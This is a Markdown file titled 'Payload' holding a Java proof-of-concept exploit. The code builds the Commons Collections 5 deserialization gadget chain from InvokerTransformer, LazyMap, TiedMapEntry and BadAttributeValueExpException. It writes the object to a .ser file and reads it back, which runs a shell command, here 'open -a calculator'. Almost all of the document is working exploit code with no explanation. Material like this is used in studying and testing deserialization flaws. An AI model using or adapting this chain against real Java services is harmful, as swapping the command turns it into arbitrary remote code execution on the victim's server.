# Payload
```java

public class Exploit {
    public static void main(String[] args) throws Exception {

        System.out.println("Security: " + System.getSecurityManager());

        String command = "open -a calculator";
        final String[] execArgs = new String[] { command };
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });

        // real chain for after setup
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1)
        };

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        Map obj =  (Map) getFieldValue(entry, "map");

        System.out.println(obj);

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, entry);

        System.out.println(obj);

        setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        // System.out.println(entry);;

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("out/serFile/cc5.ser"));
            outputStream.writeObject(val);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("out/serFile/cc5.ser"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }

        System.out.println(obj);
    }
}
```